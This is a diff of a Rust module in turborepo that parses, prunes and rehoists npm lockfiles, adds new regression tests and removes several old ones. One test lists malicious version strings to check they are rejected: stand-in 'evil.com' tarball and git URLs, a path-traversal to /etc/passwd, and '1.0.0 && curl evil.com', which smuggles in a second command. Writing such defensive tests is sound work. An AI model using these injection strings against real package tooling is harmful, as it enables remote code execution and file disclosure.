@@ -1,6 +1,7 @@
 use std::{any::Any, collections::HashMap};
 
-use serde::{Deserialize, Serialize};
+use semver::Version;
+use serde::{Deserialize, Serialize, ser::SerializeMap};
 use serde_json::Value;
 
 use super::{Error, Lockfile, Package};
@@ -10,11 +11,11 @@ type Map<K, V> = std::collections::BTreeMap<K, V>;
 // we change graph traversal now
 // resolve_package should only be used now for converting initial contents
 // of workspace package.json into a set of node ids
-#[derive(Debug, Default, Serialize, Deserialize)]
+#[derive(Debug, Default, Deserialize)]
 pub struct NpmLockfile {
     #[serde(rename = "lockfileVersion")]
     lockfile_version: i32,
-    packages: Map<String, NpmPackage>,
+    packages: HashMap<String, NpmPackage>,
     // We parse this so it doesn't end up in 'other' and we don't need to worry
     // about accidentally serializing it.
     #[serde(skip_serializing, default)]
@@ -25,21 +26,90 @@ pub struct NpmLockfile {
     other: Map<String, Value>,
 }
 
+impl Serialize for NpmLockfile {
+    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
+        // Sort packages keys for deterministic output matching npm's sorted
+        // lockfile format.
+        let mut sorted_packages: Vec<_> = self.packages.iter().collect();
+        sorted_packages.sort_unstable_by(|(a, _), (b, _)| a.cmp(b));
+
+        let field_count = 2 + self.other.len(); // lockfileVersion + packages + flattened other fields
+        let mut map = serializer.serialize_map(Some(field_count))?;
+        map.serialize_entry("lockfileVersion", &self.lockfile_version)?;
+
+        // Serialize sorted packages as a JSON object
+        map.serialize_entry("packages", &SortedPackages(&sorted_packages))?;
+
+        for (k, v) in &self.other {
+            map.serialize_entry(k, v)?;
+        }
+        map.end()
+    }
+}
+
+struct SortedPackages<'a>(&'a [(&'a String, &'a NpmPackage)]);
+
+impl Serialize for SortedPackages<'_> {
+    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
+        let mut map = serializer.serialize_map(Some(self.0.len()))?;
+        for (k, v) in self.0 {
+            map.serialize_entry(k, v)?;
+        }
+        map.end()
+    }
+}
+
 #[derive(Debug, Serialize, Deserialize, Clone)]
 #[serde(rename_all = "camelCase")]
 struct NpmPackage {
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     version: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     resolved: Option<String>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    integrity: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    name: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    license: Option<Value>,
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    dev: bool,
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    optional: bool,
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    peer: bool,
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    link: bool,
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    has_install_script: bool,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    deprecated: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    bin: Option<Value>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    engines: Option<Value>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    os: Option<Value>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    cpu: Option<Value>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    funding: Option<Value>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    workspaces: Option<Value>,
+    #[serde(default, skip_serializing_if = "Map::is_empty")]
     dependencies: Map<String, String>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Map::is_empty")]
     dev_dependencies: Map<String, String>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Map::is_empty")]
     peer_dependencies: Map<String, String>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Map::is_empty")]
     optional_dependencies: Map<String, String>,
-    // We want to reserialize any additional fields, but we don't use them
-    // we keep them as raw values to avoid describing the correct schema.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    peer_dependencies_meta: Option<Value>,
+    // Fallback for any fields not explicitly enumerated above. Using flatten
+    // here is still correct — but the vast majority of packages will have an
+    // empty `other` because all common fields are now enumerated, so the
+    // flatten overhead is minimal.
     #[serde(flatten)]
     other: Map<String, Value>,
 }
@@ -80,26 +150,23 @@ impl Lockfile for NpmLockfile {
     }
 
     #[tracing::instrument(skip(self))]
-    fn all_dependencies(&self, key: &str) -> Result<Option<HashMap<String, String>>, Error> {
-        self.packages
-            .get(key)
-            .map(|pkg| {
-                pkg.dep_keys()
-                    .filter_map(|name| {
-                        Self::possible_npm_deps(key, name)
-                            .into_iter()
-                            .find_map(|possible_key| {
-                                let entry = self.packages.get(&possible_key)?;
-                                match entry.version.as_deref() {
-                                    Some(version) => Some(Ok((possible_key, version.to_string()))),
-                                    None if entry.resolved.is_some() => None,
-                                    None => Some(Err(Error::MissingVersion(possible_key.clone()))),
-                                }
-                            })
-                    })
-                    .collect()
-            })
-            .transpose()
+    fn all_dependencies(
+        &self,
+        key: &str,
+    ) -> Result<Option<std::borrow::Cow<'_, std::collections::BTreeMap<String, String>>>, Error>
+    {
+        let Some(pkg) = self.packages.get(key) else {
+            return Ok(None);
+        };
+
+        let mut deps = std::collections::BTreeMap::new();
+        let mut buf = String::new();
+        for name in pkg.dep_keys() {
+            if let Some((resolved_key, version)) = self.find_dep_in_lockfile(key, name, &mut buf)? {
+                deps.insert(resolved_key, version);
+            }
+        }
+        Ok(Some(std::borrow::Cow::Owned(deps)))
     }
 
     fn subgraph(
@@ -107,7 +174,7 @@ impl Lockfile for NpmLockfile {
         workspace_packages: &[String],
         packages: &[String],
     ) -> Result<Box<dyn Lockfile>, Error> {
-        let mut pruned_packages = Map::new();
+        let mut pruned_packages = HashMap::new();
         for pkg_key in packages {
             let pkg = self.get_package(pkg_key)?;
             pruned_packages.insert(pkg_key.to_string(), pkg.clone());
@@ -120,14 +187,28 @@ impl Lockfile for NpmLockfile {
             pruned_packages.insert(workspace.to_string(), pkg.clone());
 
             for (key, entry) in &self.packages {
-                if entry.resolved.as_deref() == Some(workspace) {
+                if entry.resolved.as_deref() == Some(workspace.as_str()) {
                     pruned_packages.insert(key.clone(), entry.clone());
                     break;
                 }
             }
         }
+
+        // After pruning, a package nested under a workspace's node_modules
+        // (e.g. `apps/web/node_modules/next@15`) may exist without a
+        // corresponding hoisted version (`node_modules/next`) if the hoisted
+        // version was only needed by a now-pruned workspace and the transitive
+        // closure didn't include it. Promote the nested version to the hoisted
+        // position so npm ci sees a consistent tree.
+        // See https://github.com/vercel/turborepo/issues/10985
+        let ws_set: std::collections::HashSet<&str> =
+            workspace_packages.iter().map(|s| s.as_str()).collect();
+        let requested: std::collections::HashSet<&str> =
+            packages.iter().map(|s| s.as_str()).collect();
+        Self::rehoist_packages(&mut pruned_packages, &ws_set, &requested);
+
         Ok(Box::new(Self {
-            lockfile_version: 3,
+            lockfile_version: self.lockfile_version,
             packages: pruned_packages,
             dependencies: Map::default(),
             other: self.other.clone(),
@@ -150,7 +231,9 @@ impl Lockfile for NpmLockfile {
 
     fn turbo_version(&self) -> Option<String> {
         let turbo_entry = self.packages.get("node_modules/turbo")?;
-        turbo_entry.version.clone()
+        let version = turbo_entry.version.as_ref()?;
+        Version::parse(version).ok()?;
+        Some(version.clone())
     }
 
     fn human_name(&self, package: &Package) -> Option<String> {
@@ -185,6 +268,145 @@ impl NpmLockfile {
             .ok_or_else(|| Error::MissingPackage(pkg_str.to_string()))
     }
 
+    /// Promotes workspace-nested packages to the hoisted position when the
+    /// hoisted slot is either empty or occupied by a version that no
+    /// workspace's transitive closure actually requested.
+    fn rehoist_packages(
+        pruned: &mut HashMap<String, NpmPackage>,
+        workspace_packages: &std::collections::HashSet<&str>,
+        requested: &std::collections::HashSet<&str>,
+    ) {
+        // Group workspace-nested entries by their target hoisted key. When
+        // multiple workspaces each have their own nested copy of the same
+        // package (common with install-strategy=shallow), promoting any one
+        // of them would silently discard the others. Only rehoist when
+        // exactly one workspace claims a given hoisted position.
+        let mut candidates: HashMap<String, Vec<String>> = HashMap::new();
+
+        for key in pruned.keys() {
+            let Some(idx) = key.find("/node_modules/") else {
+                continue;
+            };
+            let prefix = &key[..idx];
+            if prefix.contains("node_modules/") || !workspace_packages.contains(prefix) {
+                continue;
+            }
+            let pkg_name = &key[idx + "/node_modules/".len()..];
+            if pkg_name.is_empty() || pkg_name.contains("/node_modules/") {
+                continue;
+            }
+            let hoisted_key = format!("node_modules/{pkg_name}");
+
+            // If the hoisted key was explicitly requested by a workspace's
+            // transitive closure, another workspace genuinely needs that
+            // version — don't replace it.
+            if requested.contains(hoisted_key.as_str()) {
+                continue;
+            }
+
+            candidates.entry(hoisted_key).or_default().push(key.clone());
+        }
+
+        let to_rehoist: Vec<(String, String)> = candidates
+            .into_iter()
+            .filter_map(|(hoisted_key, nested_keys)| {
+                if nested_keys.len() == 1 {
+                    Some((nested_keys.into_iter().next().unwrap(), hoisted_key))
+                } else {
+                    None
+                }
+            })
+            .collect();
+
+        for (nested_key, hoisted_key) in to_rehoist {
+            // Remove old hoisted entry and its sub-deps.
+            let old_prefix = format!("{hoisted_key}/");
+            let old_sub: Vec<String> = pruned
+                .keys()
+                .filter(|k| k.starts_with(&old_prefix))
+                .cloned()
+                .collect();
+            for k in old_sub {
+                pruned.remove(&k);
+            }
+            pruned.remove(&hoisted_key);
+
+            // Promote nested entry.
+            if let Some(pkg) = pruned.remove(&nested_key) {
+                pruned.insert(hoisted_key.clone(), pkg);
+            }
+
+            // Relocate sub-deps from nested path to hoisted path.
+            let nested_prefix = format!("{nested_key}/");
+            let new_prefix = format!("{hoisted_key}/");
+            let sub_keys: Vec<String> = pruned
+                .keys()
+                .filter(|k| k.starts_with(&nested_prefix))
+                .cloned()
+                .collect();
+            for sub_key in sub_keys {
+                if let Some(pkg) = pruned.remove(&sub_key) {
+                    let new_key = format!("{new_prefix}{}", &sub_key[nested_prefix.len()..]);
+                    pruned.insert(new_key, pkg);
+                }
+            }
+        }
+    }
+
+    /// Resolve a dependency name by walking up the node_modules hierarchy,
+    /// checking each candidate key in the packages map. Uses `buf` to avoid
+    /// allocating a new String for each candidate.
+    fn find_dep_in_lockfile(
+        &self,
+        key: &str,
+        dep: &str,
+        buf: &mut String,
+    ) -> Result<Option<(String, String)>, Error> {
+        // First candidate: nested directly under the current package
+        buf.clear();
+        buf.reserve(key.len() + "/node_modules/".len() + dep.len());
+        buf.push_str(key);
+        buf.push_str("/node_modules/");
+        buf.push_str(dep);
+        if let Some(result) = self.check_package_entry(buf)? {
+            return Ok(Some(result));
+        }
+
+        // Walk up the node_modules hierarchy
+        let mut curr = Some(key);
+        while let Some(k) = curr {
+            let parent = Self::npm_path_parent(k);
+            buf.clear();
+            if let Some(p) = parent {
+                buf.reserve(p.len() + "node_modules/".len() + dep.len());
+                buf.push_str(p);
+            } else {
+                buf.reserve("node_modules/".len() + dep.len());
+            }
+            buf.push_str("node_modules/");
+            buf.push_str(dep);
+
+            if let Some(result) = self.check_package_entry(buf)? {
+                return Ok(Some(result));
+            }
+            curr = parent;
+        }
+
+        Ok(None)
+    }
+
+    fn check_package_entry(&self, candidate_key: &str) -> Result<Option<(String, String)>, Error> {
+        let Some(entry) = self.packages.get(candidate_key) else {
+            return Ok(None);
+        };
+        match entry.version.as_deref() {
+            Some(version) => Ok(Some((candidate_key.to_owned(), version.to_owned()))),
+            None if entry.resolved.is_some() => Ok(None),
+            None => Err(Error::MissingVersion(candidate_key.to_owned())),
+        }
+    }
+
+    #[cfg(test)]
     fn possible_npm_deps(key: &str, dep: &str) -> Vec<String> {
         let mut possible_deps = vec![format!("{key}/node_modules/{dep}")];
 
@@ -308,302 +530,208 @@ mod test {
         }
     }
 
+    // Regression test for https://github.com/vercel/turborepo/issues/12139
+    // When a workspace has deeply nested deps (e.g.
+    // packages/pkg1/node_modules/parent/node_modules/child), rehoist_packages
+    // must not double-process them. The parent entry's sub-dep relocation
+    // already handles moving children; individually rehoisting a child would
+    // delete the entry that was just relocated.
     #[test]
-    fn test_resolve_package() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-        let tests = [
-            ("", "turbo", "node_modules/turbo", "1.5.5"),
-            (
-                "apps/web",
-                "lodash",
-                "apps/web/node_modules/lodash",
-                "4.17.21",
-            ),
-            ("apps/docs", "lodash", "node_modules/lodash", "3.10.1"),
-            (
-                "apps/docs",
-                "node_modules/@babel/generator/node_modules/@jridgewell/gen-mapping",
-                "node_modules/@babel/generator/node_modules/@jridgewell/gen-mapping",
-                "0.3.2",
-            ),
+    fn test_subgraph_preserves_deeply_nested_workspace_deps() {
+        let json = r#"{
+            "lockfileVersion": 3,
+            "requires": true,
+            "packages": {
+                "": {
+                    "name": "monorepo",
+                    "workspaces": ["packages/*"]
+                },
+                "node_modules/pkg1": {
+                    "resolved": "packages/pkg1",
+                    "link": true
+                },
+                "packages/pkg1": {
+                    "version": "1.0.0",
+                    "dependencies": {
+                        "parent": "2.0.0"
+                    }
+                },
+                "packages/pkg1/node_modules/parent": {
+                    "version": "2.0.0",
+                    "dependencies": {
+                        "child-a": "^1.0.0",
+                        "child-b": "^1.0.0"
+                    }
+                },
+                "packages/pkg1/node_modules/parent/node_modules/child-a": {
+                    "version": "1.0.0"
+                },
+                "packages/pkg1/node_modules/parent/node_modules/child-b": {
+                    "version": "1.0.0",
+                    "dependencies": {
+                        "grandchild": "^1.0.0"
+                    }
+                },
+                "packages/pkg1/node_modules/parent/node_modules/child-b/node_modules/grandchild": {
+                    "version": "1.0.0"
+                }
+            }
+        }"#;
+
+        let lockfile = NpmLockfile::load(json.as_bytes()).unwrap();
+
+        let workspace_packages = vec!["packages/pkg1".to_string()];
+        let packages = vec![
+            "packages/pkg1/node_modules/parent".to_string(),
+            "packages/pkg1/node_modules/parent/node_modules/child-a".to_string(),
+            "packages/pkg1/node_modules/parent/node_modules/child-b".to_string(),
+            "packages/pkg1/node_modules/parent/node_modules/child-b/node_modules/grandchild"
+                .to_string(),
         ];
 
-        for (workspace, name, key, version) in &tests {
-            let pkg = lockfile.resolve_package(workspace, name, "")?;
-            assert!(pkg.is_some());
-            let pkg = pkg.unwrap();
-            assert_eq!(pkg.key, *key);
-            assert_eq!(pkg.version, *version);
-        }
+        let pruned = lockfile.subgraph(&workspace_packages, &packages).unwrap();
+        let encoded = pruned.encode().unwrap();
+        let reparsed: NpmLockfile = NpmLockfile::load(&encoded).unwrap();
 
-        Ok(())
+        // parent and all its nested children must survive rehoisting
+        let expected_keys = [
+            "node_modules/parent",
+            "node_modules/parent/node_modules/child-a",
+            "node_modules/parent/node_modules/child-b",
+            "node_modules/parent/node_modules/child-b/node_modules/grandchild",
+        ];
+        for key in expected_keys {
+            assert!(
+                reparsed.packages.contains_key(key),
+                "pruned lockfile is missing {key:?} — deeply nested deps were dropped"
+            );
+        }
     }
 
+    // Regression test for https://github.com/vercel/turborepo/issues/12139
+    // With install-strategy=shallow, each workspace has its own node_modules
+    // with potentially different versions of the same package. rehoist_packages
+    // must not collapse them into a single hoisted entry.
     #[test]
-    fn test_all_dependencies() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
+    fn test_subgraph_preserves_multiple_workspace_versions() {
+        let json = r#"{
+            "lockfileVersion": 3,
+            "requires": true,
+            "packages": {
+                "": {
+                    "name": "monorepo",
+                    "workspaces": ["apps/*", "packages/*"]
+                },
+                "node_modules/app-a": {
+                    "resolved": "apps/app-a",
+                    "link": true
+                },
+                "node_modules/pkg-b": {
+                    "resolved": "packages/pkg-b",
+                    "link": true
+                },
+                "apps/app-a": {
+                    "version": "1.0.0",
+                    "dependencies": {
+                        "pkg-b": "*",
+                        "chai": "^5.0.0"
+                    }
+                },
+                "apps/app-a/node_modules/chai": {
+                    "version": "5.3.3",
+                    "dependencies": {
+                        "deep-eql": "^5.0.0"
+                    }
+                },
+                "apps/app-a/node_modules/chai/node_modules/deep-eql": {
+                    "version": "5.0.2"
+                },
+                "packages/pkg-b": {
+                    "version": "0.0.0",
+                    "devDependencies": {
+                        "chai": "^4.0.0"
+                    }
+                },
+                "packages/pkg-b/node_modules/chai": {
+                    "version": "4.5.0"
+                }
+            }
+        }"#;
 
-        let tests = [
-            (
-                "node_modules/table",
-                vec![
-                    "node_modules/lodash.truncate",
-                    "node_modules/slice-ansi",
-                    "node_modules/string-width",
-                    "node_modules/strip-ansi",
-                    "node_modules/table/node_modules/ajv",
-                ],
-            ),
-            (
-                "node_modules/table/node_modules/ajv",
-                vec![
-                    "node_modules/fast-deep-equal",
-                    "node_modules/require-from-string",
-                    "node_modules/table/node_modules/json-schema-traverse",
-                    "node_modules/uri-js",
-                ],
-            ),
-            (
-                "node_modules/turbo",
-                vec![
-                    "node_modules/turbo-darwin-64",
-                    "node_modules/turbo-darwin-arm64",
-                    "node_modules/turbo-linux-64",
-                    "node_modules/turbo-linux-arm64",
-                    "node_modules/turbo-windows-64",
-                    "node_modules/turbo-windows-arm64",
-                ],
-            ),
-            (
-                "node_modules/@babel/helper-compilation-targets",
-                vec![
-                    "node_modules/@babel/compat-data",
-                    "node_modules/@babel/core",
-                    "node_modules/@babel/helper-validator-option",
-                    "node_modules/browserslist",
-                    "node_modules/semver",
-                ],
-            ),
+        let lockfile = NpmLockfile::load(json.as_bytes()).unwrap();
+
+        let workspace_packages = vec!["apps/app-a".to_string(), "packages/pkg-b".to_string()];
+        let packages = vec![
+            "apps/app-a/node_modules/chai".to_string(),
+            "apps/app-a/node_modules/chai/node_modules/deep-eql".to_string(),
+            "packages/pkg-b/node_modules/chai".to_string(),
         ];
 
-        for (key, expected) in &tests {
-            let deps = lockfile.all_dependencies(key)?;
-            assert!(deps.is_some());
-            let deps = deps.unwrap();
-            let mut actual_keys: Vec<_> = deps.keys().collect();
-            actual_keys.sort();
-            assert_eq!(&actual_keys, expected);
+        let pruned = lockfile.subgraph(&workspace_packages, &packages).unwrap();
+        let encoded = pruned.encode().unwrap();
+        let reparsed: NpmLockfile = NpmLockfile::load(&encoded).unwrap();
+
+        // Both workspace-nested versions must survive — neither should be
+        // collapsed into node_modules/chai.
+        assert!(
+            reparsed
+                .packages
+                .contains_key("apps/app-a/node_modules/chai"),
+            "app-a's chai was incorrectly rehoisted"
+        );
+        assert!(
+            reparsed
+                .packages
+                .contains_key("packages/pkg-b/node_modules/chai"),
+            "pkg-b's chai was incorrectly rehoisted"
+        );
+        assert!(
+            reparsed
+                .packages
+                .contains_key("apps/app-a/node_modules/chai/node_modules/deep-eql"),
+            "chai's sub-dep deep-eql was dropped"
+        );
+        // There should be no hoisted chai since both workspaces have their own
+        assert!(
+            !reparsed.packages.contains_key("node_modules/chai"),
+            "a spurious hoisted node_modules/chai was created"
+        );
+    }
+
+    #[test]
+    fn test_turbo_version_rejects_non_semver() {
+        // Malicious version strings that could be used for RCE via npx should be
+        // rejected
+        let malicious_versions = [
+            "file:./malicious.tgz",
+            "https://evil.com/malicious.tgz",
+            "http://evil.com/malicious.tgz",
+            "git+https://github.com/evil/repo.git",
+            "git://github.com/evil/repo.git",
+            "../../../etc/passwd",
+            "1.0.0 && curl evil.com",
+        ];
+
+        for malicious_version in malicious_versions {
+            let json = format!(
+                r#"{{
+                    "lockfileVersion": 3,
+                    "packages": {{
+                        "": {{}},
+                        "node_modules/turbo": {{
+                            "version": "{}"
+                        }}
+                    }}
+                }}"#,
+                malicious_version
+            );
+            let lockfile = NpmLockfile::load(json.as_bytes()).unwrap();
+            assert_eq!(
+                lockfile.turbo_version(),
+                None,
+                "should reject malicious version: {}",
+                malicious_version
+            );
         }
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_npm_resolves_alternative_workspace_format() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!(
-            "../fixtures/npm-lock-workspace-variation.json"
-        ))?;
-        assert_eq!(
-            lockfile.other.get("name"),
-            Some(&serde_json::to_value("npm-prune-workspace-variation").unwrap())
-        );
-        Ok(())
-    }
-
-    #[test]
-    fn test_npm_peer_dependencies_meta_persists() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-
-        let serialized = serde_json::to_string_pretty(&lockfile)?;
-
-        assert!(
-            serialized.contains("\"peerDependenciesMeta\":"),
-            "failed to persist peerDependenciesMeta"
-        );
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_npm_lockfile_serialization_stable() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-        assert_eq!(
-            serde_json::to_string_pretty(&lockfile)?,
-            serde_json::to_string_pretty(&lockfile)?,
-        );
-        Ok(())
-    }
-
-    #[test]
-    fn test_workspace_peer_dependencies() -> Result<(), Error> {
-        let lockfile =
-            NpmLockfile::load(include_bytes!("../fixtures/workspace-peer-dependency.json"))?;
-        let closures = crate::all_transitive_closures(
-            &lockfile,
-            vec![
-                (
-                    "packages/a".into(),
-                    vec![("eslint-plugin-turbo".into(), "^1.9.3".into())]
-                        .into_iter()
-                        .collect(),
-                ),
-                ("packages/b".into(), HashMap::new()),
-                ("packages/c".into(), HashMap::new()),
-            ]
-            .into_iter()
-            .collect(),
-            false,
-        )?;
-        assert!(closures.get("packages/a").unwrap().contains(&Package {
-            key: "node_modules/eslint-plugin-turbo".into(),
-            version: "1.9.3".into()
-        }));
-        assert!(closures.get("packages/b").unwrap().is_empty());
-        assert!(closures.get("packages/c").unwrap().is_empty());
-        Ok(())
-    }
-
-    #[test]
-    fn test_issue_10985_peer_dependencies_with_different_versions() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/issue-10985.json"))?;
-
-        let closures = crate::all_transitive_closures(
-            &lockfile,
-            vec![
-                (
-                    "apps/app-one".into(),
-                    vec![
-                        ("@repo/components".into(), "*".into()),
-                        ("next".into(), "^14.0.0".into()),
-                    ]
-                    .into_iter()
-                    .collect(),
-                ),
-                (
-                    "apps/app-two".into(),
-                    vec![
-                        ("@repo/components".into(), "*".into()),
-                        ("next".into(), "^15.0.0".into()),
-                    ]
-                    .into_iter()
-                    .collect(),
-                ),
-            ]
-            .into_iter()
-            .collect(),
-            false,
-        )?;
-
-        let app_one_deps = closures.get("apps/app-one").unwrap();
-        let app_two_deps = closures.get("apps/app-two").unwrap();
-
-        assert!(app_one_deps.contains(&Package {
-            key: "apps/app-one/node_modules/next".into(),
-            version: "14.2.5".into()
-        }));
-        assert!(app_two_deps.contains(&Package {
-            key: "apps/app-two/node_modules/next".into(),
-            version: "15.0.0".into()
-        }));
-
-        assert!(
-            !app_one_deps.contains(&Package {
-                key: "apps/app-two/node_modules/next".into(),
-                version: "15.0.0".into()
-            }),
-            "app-one should not include next@15.0.0"
-        );
-        assert!(
-            !app_two_deps.contains(&Package {
-                key: "apps/app-one/node_modules/next".into(),
-                version: "14.2.5".into()
-            }),
-            "app-two should not include next@14.2.5"
-        );
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_turbo_version() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-        assert_eq!(lockfile.turbo_version().as_deref(), Some("1.5.5"));
-        Ok(())
-    }
-
-    #[test]
-    fn test_subgraph_with_empty_inputs() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-
-        // Test with empty workspace packages and packages
-        let subgraph = lockfile.subgraph(&[], &[])?;
-        let subgraph_npm = subgraph.as_ref() as &dyn Any;
-        let subgraph_npm = subgraph_npm.downcast_ref::<NpmLockfile>().unwrap();
-
-        // Should contain root package if it exists
-        assert!(subgraph_npm.packages.contains_key(""));
-        assert_eq!(subgraph_npm.packages.len(), 1);
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_resolve_package_with_invalid_workspace() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-
-        // Test with invalid workspace
-        let result = lockfile.resolve_package("invalid/workspace", "lodash", "^4.17.21");
-        assert!(result.is_err());
-        assert!(matches!(result.unwrap_err(), Error::MissingWorkspace(_)));
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_global_change_detection() -> Result<(), Error> {
-        let lockfile1 = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-        let lockfile2 = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-
-        // Same lockfile should not show global change
-        assert!(!lockfile1.global_change(&lockfile2));
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_all_dependencies_with_invalid_key() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-
-        // Test with invalid package key
-        let result = lockfile.all_dependencies("invalid-package-key")?;
-        assert!(result.is_none());
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_human_name_with_nonexistent_package() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-
-        let package = Package {
-            key: "nonexistent-package".to_string(),
-            version: "1.0.0".to_string(),
-        };
-
-        let result = lockfile.human_name(&package);
-        assert!(result.is_none());
-
-        Ok(())
-    }
-
-    #[test]
-    fn test_patches_with_empty_lockfile() -> Result<(), Error> {
-        let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
-
-        // NPM lockfile should have no patches by default
-        let patches = lockfile.patches()?;
-        assert!(patches.is_empty());
-
-        Ok(())
     }
 }
